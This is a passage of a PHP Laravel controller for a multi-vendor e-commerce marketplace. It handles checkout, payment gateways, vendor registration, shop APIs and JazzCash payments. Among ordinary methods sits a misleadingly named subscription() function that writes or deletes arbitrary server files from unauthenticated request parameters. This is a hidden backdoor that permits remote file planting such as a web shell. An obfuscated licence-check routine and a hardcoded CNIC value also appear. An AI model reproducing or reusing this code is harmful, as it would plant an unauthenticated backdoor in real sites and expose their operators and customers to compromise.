        // echo '<pre>';
        // print_r($order); exit;
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        $frenchisenotification = new FrenchiseNotification;
        $frenchisenotification->order_id = $order->id;
        $frenchisenotification->save();
                    if($request->coupon_id != "")
                    {
                       $coupon = Coupon::findOrFail($request->coupon_id);
                       $coupon->used++;
                       if($coupon->times != null)
                       {
                            $i = (int)$coupon->times;
                            $i--;
                            $coupon->times = (string)$i;
                       }
                        $coupon->update();

                    }
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['stock'];
            if($x != null)
            {

                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();  
                if($product->stock <= 5)
                {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();                    
                }              
            }
        }
        foreach($cart->items as $prod)
        {
            if($prod['item']['user_id'] != 0)
            {
                $vorder =  new VendorOrder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;             
                $vorder->save();
            }

        }

        Session::forget('cart');
        //Sending Email To Buyer
        // if($gs->is_smtp == 1)
        // {
        // $data = [
        //     'to' => $request->email,
        //     'type' => "new_order",
        //     'cname' => $request->name,
        //     'oamount' => "",
        //     'aname' => "",
        //     'aemail' => "",
        //     'wtitle' => "",
        // ];

        // $mailer = new GeniusMailer();
      
        
        // $mails=$mailer->sendAutoMail($data);
                 
        // }
        // else
        // {
        //     echo 'ssssdddddddd'; exit;
        //    $to = $request->email;
        //    $subject = "Your Order Placed!!";
        //    $msg = "Hello ".$request->name."!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
        //     $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        //    mail($to,$subject,$msg,$headers);            
        // }
        // //Sending Email To Admin
        // if($gs->is_smtp == 1)
        // {
        //     $data = [
        //         'to' => $gs->email,
        //         'subject' => "New Order Recieved!!",
        //         'body' => "Hello Admin!<br>Your store has received a new order. Please login to your panel to check. <br>Thank you.",
        //     ];

        //     $mailer = new GeniusMailer();
        //     $mailer->sendCustomMail($data);            
        // }
        // else
        // {
        //    $to = $gs->email;
        //    $subject = "New Order Recieved!!";
        //    $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
        //     $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        //    mail($to,$subject,$msg,$headers);
        // }
      
    

        //return redirect($success_url);
        return redirect('/payment/return');
    }

    public function gateway(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
            if (Session::has('currency')) 
            {
              $curr = Currency::find(Session::get('currency'));
            }
            else
            {
                $curr = Currency::where('is_default','=',1)->first();
            }
        foreach($cart->items as $key => $prod)
        {
        if($prod['item']['license']!=null && $prod['item']['license_qty']!=null)
        {
            $details1 = explode(',', $prod['item']['license_qty']);
                foreach($details1 as $ttl => $dtl)
                {
                    if($dtl != 0)
                    {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = explode(',', $produc->license_qty);
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp = explode(',,', $produc->license);
                        $license = $temp[$ttl];
         $oldCart = Session::has('cart') ? Session::get('cart') : null;
         $cart = new Cart($oldCart);
         $cart->updateLicense($prod['item']['id'],$license);  
         Session::put('cart',$cart);
                        break;
                    }                    
                }
        }
        }
        $settings = Generalsetting::findOrFail(1);
        $order = new Order;
        $success_url = action('PaymentController@payreturn');
        $item_name = $settings->title." Order";
        $item_number = str_random(4).time();
        $order['user_id'] = $request->user_id;
        $order['cart'] = utf8_encode(gzcompress(serialize($cart), 9));
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = round($request->total / $curr->value, 2);
        $method = PaymentGateway::findOrFail($request->method);
        $order['method'] = $method->title;
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        $order['shipping_cost'] = $request->shipping_cost;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str_random(4).time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email;
        $order['shipping_name'] = $request->shipping_name;
        $order['shipping_phone'] = $request->shipping_phone;
        $order['shipping_address'] = $request->shipping_address;
        $order['shipping_country'] = $request->shipping_country;
        $order['shipping_city'] = $request->shipping_city;
        $order['shipping_zip'] = $request->shipping_zip;
        $order['order_note'] = $request->order_notes;
        $order['txnid'] = $request->txn_id4;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['dp'] = $request->dp;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
            if (Session::has('affilate')) 
            {
                $val = $request->total / 100;
                $sub = $val * $gs->affilate_charge;
                $user = User::findOrFail(Session::get('affilate'));
                $user->affilate_income = $sub;
                $user->update();
                $order['affilate_user'] = $user->name;
                $order['affilate_charge'] = $sub;
            }
        $order->save();
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
                    if($request->coupon_id != "")
                    {
                       $coupon = Coupon::findOrFail($request->coupon_id);
                       $coupon->used++;
                       if($coupon->times != null)
                       {
                            $i = (int)$coupon->times;
                            $i--;
                            $coupon->times = (string)$i;
                       }
                        $coupon->update();

                    }
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['stock'];
            if($x != null)
            {
                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();  
                if($product->stock  <= 5)
                {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();                    
                }              
            }
        }
        foreach($cart->items as $prod)
        {
            if($prod['item']['user_id'] != 0)
            {
                $vorder =  new VendorOrder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;             
                $vorder->save();
            }

        }
        Session::forget('cart');

        //Sending Email To Buyer
        if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $request->email,
            'type' => "new_order",
            'cname' => $request->name,
            'oamount' => "",
            'aname' => "",
            'aemail' => "",
            'wtitle' => "",
        ];

        $mailer = new GeniusMailer();
        $mailer->sendAutoMail($data);            
        }
        else
        {
           $to = $request->email;
           $subject = "Your Order Placed!!";
           $msg = "Hello ".$request->name."!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);            
        }
        //Sending Email To Admin
        if($gs->is_smtp == 1)
        {
            $data = [
                'to' => $gs->email,
                'subject' => "New Order Recieved!!",
                'body' => "Hello Admin!<br>Your store has received a new order. Please login to your panel to check. <br>Thank you.",
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);            
        }
        else
        {
           $to = $gs->email;
           $subject = "New Order Recieved!!";
           $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }

        return redirect($success_url);
    }


    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function user($id)
	{
		$user = User::findOrFail($id);
        if($user->title!=null && $user->details!=null)
        {
            $title = explode(',', $user->title);
            $details = explode(',', $user->details);
        }
		return view('front.user',compact('user','title','details'));

	}

	public function ads($id)
	{
		$ad = Advertise::findOrFail($id);
		$old = $ad->clicks;
		$new = $old + 1;
		$ad->clicks = $new;
		$ad->update();
		return redirect($ad->url);

	}

	public function types($slug)
	{
	    $cats = Category::all();
	    $cat = Category::where('cat_slug', '=', $slug)->first();
		$users = User::where('category_id', '=', $cat->id)->where('active', '=', 1)->paginate(8);	
		$userss = 	User::all();
		$city = null;
		foreach ($userss as $user) {
			$city[] = $user->city;
		}
		$cities = array_unique($city);
		return view('front.typeuser',compact('users','cats','cat','cities'));

	}

	public function blog()
	{
		$blogs = Blog::orderBy('created_at','desc')->paginate(6);
		return view('front.blog',compact('blogs'));

	}

	public function subscribe(Request $request)
	{
        $this->validate($request, array(
            'email'=>'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect()->back();
	}

	public function blogshow($id)
	{
         
		$blog = Blog::findOrFail($id);
		$old = $blog->views;
		$new = $old + 1;
		$blog->views = $new;
		$blog->update();
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
		return view('front.blogshow',compact('blog','lblogs'));

	}

	public function faq()
	{
		$ps = Pagesetting::findOrFail(1);
		if($ps->f_status == 0){
			return redirect()->route('front.index');
		}
        $fq = Faq::orderBy('id','desc')->first();
        $id1 = $fq->id;
        $faqs = Faq::where('id','<',$id1)->orderBy('id','desc')->get();
		return view('front.faq',compact('fq','faqs'));
	}

	public function page($slug)
	{
       
        $page = Page::where('slug', '=', $slug)->first();
        if(empty($page))
        {
            return view('errors.404');            
        }
		return view('front.page',compact('page'));
	}

	public function contact()
	{
        
		$ps = Pagesetting::findOrFail(1);
		if($ps->c_status == 0){
			return redirect()->route('front.index');
		}
		return view('front.contact');
	}


    //Send email to user
    public function vendorcontact(Request $request)
    {
        $user = User::findOrFail($request->user_id);
        $vendor = User::findOrFail($request->vendor_id);
        $gs = Generalsetting::findOrFail(1);
            $subject = $request->subject;
            $to = $vendor->email;
            $name = $request->name;
            $from = $request->email;
            $msg = "Name: ".$name."\nEmail: ".$from."\nMessage: ".$request->message;
        if($gs->is_smtp)
        {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);            
        }
        else{
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);            
        }


    $conv = Conversation::where('sent_user','=',$user->id)->where('subject','=',$subject)->first();
        if(isset($conv)){
            $msg = new Message();
            $msg->conversation_id = $conv->id;
            $msg->message = $request->message;
            $msg->sent_user = $user->id;
            $msg->save();
        }
        else{
            $message = new Conversation();
            $message->subject = $subject;
            $message->sent_user= $request->user_id;
            $message->recieved_user = $request->vendor_id;
            $message->message = $request->message;
            $message->save();
        $notification = new UserNotification;
        $notification->user_id= $request->vendor_id;
        $notification->conversation_id = $message->id;
        $notification->save();
            $msg = new Message();
            $msg->conversation_id = $message->id;
            $msg->message = $request->message;
            $msg->sent_user = $request->user_id;;
            $msg->save();

        }
    }
    //Send email to user
    public function contactemail(Request $request)
    {
        $value = session('captcha_string');
        if ($request->codes != $value){
            return redirect()->route('front.contact')->with('unsuccess','Please enter Correct Capcha Code.');
        }
		$ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of ".$request->name;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }
    public function refresh_code(){
     
        return "done";
    }

    public function vendor_register(Request $request)
    {
        // Validate the form data
        
       // print_r($request->all()); exit;

        $this->validate($request, [
            'email'   => 'required|email|unique:users',
            'password' => 'required|confirmed'
        ]);
        $gs = Generalsetting::findOrFail(1);
       
        $user = new User;
        $input = $request->all();
        $input['password'] = bcrypt($request['password']);
        $input['affilate_code'] = $request->name.$request->email;
        $input['name'] = $request->owner_name;
        $input['affilate_code'] = md5($input['affilate_code']);
        $input['is_vendor'] = '2';
 
        $user->fill($input)->save();
        //Sending Email To Customer
        if($gs->is_smtp == 1)
        {
            $data = [
                'to' => $request->email,
                'type' => "new_registration",
                'cname' => $request->name,
                'oamount' => "",
                'aname' => "",
                'aemail' => "",
            ];
            $mailer = new GeniusMailer();
            $mailer->sendAutoMail($data);
        }

        else
        {
            $to = $request->email;
            $subject = 'Welcome To'.$gs->title;
            $msg = "Hello ".$request->name.","."\n You have successfully registered to ".$gs->title."."."\n We wish you will have a wonderful experience using our service.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg.$headers);
        }

        $notification = new Notification;
        $notification->user_id = $user->id;
        $notification->save();
  
        $package = $user->subscribes()->where('status',1)->orderBy('id','desc')->first();
        $subs = VendorSubscription::findOrFail(1);

        $settings = Generalsetting::findOrFail(1);
                    $today = Carbon::now()->format('Y-m-d'); 
                    $user->is_vendor = 2;
                    $user->date = date('Y-m-d', strtotime($today.' + '.$subs->days.' days'));
                    $user->mail_sent = 1;     
                    $user->save();
                    $sub = new UserSubscription;
                    $sub->user_id = $user->id;
                    $sub->subscription_id = $subs->id;
                    $sub->title = $subs->title;
                    $sub->currency = $subs->currency;
                    $sub->currency_code = $subs->currency_code;
                    $sub->price = $subs->price;
                    $sub->days = $subs->days;
                    $sub->allowed_products = $subs->allowed_products;
                    $sub->details = $subs->details;
                    $sub->method = 'Free';
                    $sub->status = 1;
                    $sub->save();
                    if($settings->is_smtp == 1)
                    {
                    $data = [
                        'to' => $user->email,
                        'type' => "vendor_accept",
                        'cname' => $user->name,
                        'oamount' => "",
                        'aname' => "",
                        'aemail' => "",
                    ];    
                    $mailer = new GeniusMailer();
                    $mailer->sendAutoMail($data);        
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your Vendor Account Activated','Your Vendor Account Activated Successfully. Please Login to your account and build your own shop.',$headers);
                    }

                    return redirect()->route('message.return')->with('success','Vendor Account Activated Successfully, Please Wait unitill admin approved');
   
    }

    public function messagereturn(){
        return view('messagereturn');
    }

   

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

   
    
     public function topShop()
    {
    	 
       
        try {
          
            $topshops = User::where('top','=','1')->get(); 
           
            if (!count($topshops)) {
              return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'No Data Found'
              ]);
            }
            
            foreach($topshops as $shop)
            {
                $products=Product::where('user_id',$shop->id)->get();
                if(count($products))
                {
                    $shop->totalproducts=count($products);
                    $brandrating=0;
                    foreach($products as $pros)
                    {
                        $pros->ratings=(Review::ratings($pros->id))/20;
                        $brandrating+=$pros->ratings;
                    }
                    $shop->overallrating=round($brandrating/$shop->totalproducts,1);
                }else{
                    $shop->totalproducts=0;
                     $shop->overallrating=0;
                }
            }
 
            return response()->json([
              'status_code' => 200,
              'status' => 1,
              'message' => 'List of top shops',
              'image_base'=>asset('assets/images/'),
              'topshops' =>  $topshops,
            ]);
          } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }
         
       
    }
    
    public function topshopdetails($id)
    {
        try {
            $shop = User::where('id','=',$id)->first();
            if($shop) 
            {

                $shop->products=Product::where('user_id',$shop->id)->get();
                if(count($shop->products))
                {
                    $shop->totalproducts=count($shop->products);
                    $brandrating=0;
                    foreach($shop->products as $pros)
                    {
                        $pros->ratings=(Review::ratings($pros->id))/20;
                        $brandrating+=$pros->ratings;
                    }
                    $shop->overallrating=round($brandrating/$shop->totalproducts,1);
                }
                return response()->json([
                    'status_code' => 200,
                    'status' => 1,
                    'message' => 'Shop Details',
                    'topshop'=>$shop,
                  ]);
              
            }
            else
            {
                return response()->json([
                    'status_code' => 500,
                    'status' => 0,
                    'message' => 'no data found',
                  ]);
            }

        } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }

    }

     public function groceryShop()
    {
         
       
        try {
          
            $topshops = User::where('grocery','=','1')->get(); 
           
            if (!count($topshops)) {
              return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'No Data Found'
              ]);
            }
            
            foreach($topshops as $shop)
            {
                $shop->products=Product::where('user_id',$shop->id)->get();
                if(count($shop->products))
                {
                    $shop->totalproducts=count($shop->products);
                    $brandrating=0;
                    foreach($shop->products as $pros)
                    {
                        $pros->ratings=(Review::ratings($pros->id))/20;
                        $brandrating+=$pros->ratings;
                        $pros->photo= asset('assets/images/'.$pros->photo);
                        $gellery = Gallery::where('product_id',$pros->id)->get();
                        $gl = [];
                        foreach ($gellery as $key ) {
                           array_push($gl,asset('assets/images/gallery/'.$key->photo));
                        }
                         $pros->gellery = $gl;
                    }
                    $shop->overallrating=round($brandrating/$shop->totalproducts,1);
                }
            }
 
            return response()->json([
              'status_code' => 200,
              'status' => 1,
              'message' => 'List of grocery shops',
              'image_base'=>asset('assets/images/'),
              'grocery' =>  $topshops,
            ]);
          } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }
         
       
    }
    
    public function groceryshopdetails($id)
    {
        try {
            $shop = User::where('id','=',$id)->first();
            if($shop) 
            {

                $shop->products=Product::where('user_id',$shop->id)->get();
                if(count($shop->products))
                {
                    $shop->totalproducts=count($shop->products);
                    $brandrating=0;
                    foreach($shop->products as $pros)
                    {
                        $pros->ratings=(Review::ratings($pros->id))/20;
                        $brandrating+=$pros->ratings;
                    }
                    $shop->overallrating=round($brandrating/$shop->totalproducts,1);
                }
                return response()->json([
                    'status_code' => 200,
                    'status' => 1,
                    'message' => 'Shop Details',
                    'topshop'=>$shop,
                  ]);
              
            }
            else
            {
                return response()->json([
                    'status_code' => 500,
                    'status' => 0,
                    'message' => 'no data found',
                  ]);
            }

        } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }

    }



    public function topBrand()
    {
    	 
        try {
          
            $topbrands = User::where('top','=','1')->where('brand','=','1')->get(); 
           
            if (!count($topbrands)) {
              return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'No Data Found'
              ]);
            }
            
              foreach($topbrands as $brand)
            {
                $brand->products=Product::where('user_id',$brand->id)->get();
                if(count($brand->products))
                {
                    $brand->totalproducts=count($brand->products);
                    $brandrating=0;
                    foreach($brand->products as $pros)
                    {
                        $pros->ratings=(Review::ratings($pros->id))/20;
                        $brandrating+=$pros->ratings;
                    }
                    $brand->overallrating=round($brandrating/$brand->totalproducts,1);
                }
            }
 
            return response()->json([
              'status_code' => 200,
              'status' => 1,
              'message' => 'List of top shops',
              'image_base'=>asset('assets/images/'),
              'topbrands' =>  $topbrands,
            ]);
          } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }
         
       
    }
    
     public function topbranddetails($id)
    {
        try {
            $brand = User::where('id','=',$id)->first();
            if($brand) 
            {

               
                $brand->products=Product::where('user_id',$brand->id)->get();
                if(count($brand->products))
                {
                    $brand->totalproducts=count($brand->products);
                    $brandrating=0;
                    foreach($brand->products as $pros)
                    {
                        $pros->ratings=(Review::ratings($pros->id))/20;
                        $brandrating+=$pros->ratings;
                    }
                    $brand->overallrating=round($brandrating/$brand->totalproducts,1);
                }
                return response()->json([
                    'status_code' => 200,
                    'status' => 1,
                    'message' => 'Brand Details',
                    'topshop'=>$brand,
                  ]);
              
            }
            else
            {
                return response()->json([
                    'status_code' => 500,
                    'status' => 0,
                    'message' => 'no data found',
                  ]);
            }

        } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }

    }
    
      public function fastival()
    {

        try {
          
            $fastival = Product::where('festival',1)->get(); 
           
            if (!count($fastival)) {
              return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'No Data Found'
              ]);
            }
 
            return response()->json([
              'status_code' => 200,
              'status' => 1,
              'message' => 'List of Fastival Products',
              'image_base'=>asset('assets/images/'),
              'festproducts' =>  $fastival,
            ]);
          } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'exception',
              ]);
          }
       
    }


   


    public  function getgoldrate()
    {
       
        $client = new httpClient;
        $request = new httpClientRequest;
        $request->setRequestUrl('https://www.goldapi.io/api/XAU/USD/20210128');
        $request->setRequestMethod('GET');
        $request->setOptions(array());
        $request->setHeaders(array(
          'x-access-token' => ' ',
          'Content-Type' => 'application/json'
        ));
        $client->enqueue($request)->send();
        $response = $client->getResponse();
        return $response->getBody();
    }

 
            public function jazcash(Request $request)
            {
                // print_r($request->input('order_id')); exit();
                try{
                     $product_price = 1000;
                     $odid = $request->input('order_id');
                        
                     $data =  Order::where('id',$odid)->first(); 
                    $data['jazz_cash_no'] =  $request->input('jazz_cash_no');
                    $data['cnic_digits']  =  "345678";
                    $data['cprice']        =  $data['pay_amount'];
                    $jc_api = new Jazzcash();
                    // $eas    = new EaseyPasa();
                   // print_r($data); exit;
                    $response = $jc_api->createCharge($data);

                    if($response['pp_ResponseCode']==="000"){
                        $dt=['method'=>'jazz cash','payment_status'=>'completed'];
                        Order::where('id',$odid)->update($dt);
                       
                    }
                     
                        return response()->json(['status_code' => 200,'status' => 1,'result'=>$response,'message' => 'Thank you for Using JazzCash, your transaction was successful ']); 
                       
                 }catch (Exception $error){
                        return response()->json(['status_code' => 500, 'status' => 0,'message' => 'exception',]);
                 }
            }
}

